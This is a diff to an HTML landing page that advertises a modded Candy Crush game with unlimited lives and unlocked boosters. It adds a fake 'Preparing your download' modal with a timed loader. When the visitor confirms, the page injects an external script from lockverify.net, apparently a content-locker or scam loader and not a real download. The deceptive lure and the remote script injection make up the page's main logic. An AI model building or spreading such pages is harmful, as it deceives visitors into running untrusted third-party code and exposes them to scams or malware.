@@ -305,7 +305,22 @@
 .footer-bottom p {
   margin: 5px 0;
 }
+/* Dot animation */
+.dot {
+  width: 12px;
+  height: 12px;
+  background:#ff4081;
+  border-radius:50%;
+  animation: bounce 1.2s infinite ease-in-out;
+}
+.dot:nth-child(1) { animation-delay: 0s; }
+.dot:nth-child(2) { animation-delay: 0.2s; }
+.dot:nth-child(3) { animation-delay: 0.4s; }
 
+@keyframes bounce {
+  0%, 80%, 100% { transform: scale(0); }
+  40% { transform: scale(1); }
+}
 /* Responsive */
 @media (min-width: 768px) {
   .footer-top {
@@ -369,7 +384,7 @@
     <div class="hero-content">
       <h1>CANDY CRUSH MOD</h1>
       <p>Unlimited lives, boosters unlocked, and sweet rewards to crush every level!</p>
-      <a href="#" class="btn">DOWNLOAD NOW</a>
+      <a href="#download" class="btn">DOWNLOAD NOW</a>
       <p style="margin-top:10px; font-size:0.9rem;">Total Downloads: 5.7M+</p>
     </div>
   </section>
@@ -452,6 +467,27 @@
   </div>
 </footer>
 
+<!-- Modal Overlay -->
+<div id="downloadModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; justify-content:center; align-items:center;">
+  <div style="background:#fff; padding:30px; border-radius:12px; text-align:center; max-width:400px; width:90%;">
+    <h2 style="color:#333; margin-bottom:15px; font-weight:600;">Start Download?</h2>
+    <p style="color:#555; font-size:1rem;">Do you want to start downloading Candy Crush Saga Mod now?</p>
+    <div style="margin-top:25px;">
+      <button id="confirmDownload" style="padding:12px 25px; background:#ff4081; color:#fff; border:none; border-radius:8px; margin-right:10px; cursor:pointer;">Yes, Download</button>
+      <button id="cancelDownload" style="padding:12px 25px; background:#ccc; color:#333; border:none; border-radius:8px; cursor:pointer;">Cancel</button>
+    </div>
+    <div id="loader" style="display:none; margin-top:20px;">
+      <p style="color:#333; font-size:1rem;">Preparing your download</p>
+      <div style="display:flex; justify-content:center; margin-top:15px; gap:8px;">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
 
   <!-- JS -->
   <script>
@@ -462,19 +498,48 @@
     menu.classList.toggle('active');
     toggle.classList.toggle('active');
   });
+// Modal elements
+const downloadBtn = document.getElementById('downloadBtn');
+const modal = document.getElementById('downloadModal');
+const confirmBtn = document.getElementById('confirmDownload');
+const cancelBtn = document.getElementById('cancelDownload');
+const loader = document.getElementById('loader');
 
- const downloadBtn = document.getElementById('downloadBtn');
-  downloadBtn.addEventListener('click', function(e) {
-    e.preventDefault(); // prevent default link
-    if (!document.getElementById('ogjs')) { // prevent multiple injections
+// Show modal on click
+downloadBtn.addEventListener('click', function(e) {
+  e.preventDefault();
+  modal.style.display = 'flex';
+});
+
+// Cancel download
+cancelBtn.addEventListener('click', function() {
+  modal.style.display = 'none';
+  loader.style.display = 'none';
+  confirmBtn.style.display = 'inline-block';
+  cancelBtn.style.display = 'inline-block';
+});
+
+// Confirm download
+confirmBtn.addEventListener('click', function() {
+  loader.style.display = 'block'; // show loader
+  confirmBtn.style.display = 'none';
+  cancelBtn.style.display = 'none';
+  
+  // Wait 10s then load script
+  setTimeout(function() {
+    if (!document.getElementById('ogjs')) {
       const script = document.createElement('script');
       script.type = 'text/javascript';
       script.id = 'ogjs';
       script.src = 'https://lockverify.net/cl/js/n62prn';
       document.body.appendChild(script);
-      console.log('Script loaded in the same page!');
     }
-  });
+    modal.style.display = 'none';
+    loader.style.display = 'none';
+    confirmBtn.style.display = 'inline-block';
+    cancelBtn.style.display = 'inline-block';
+  }, 10000);
+});
   </script>
 
 </body>
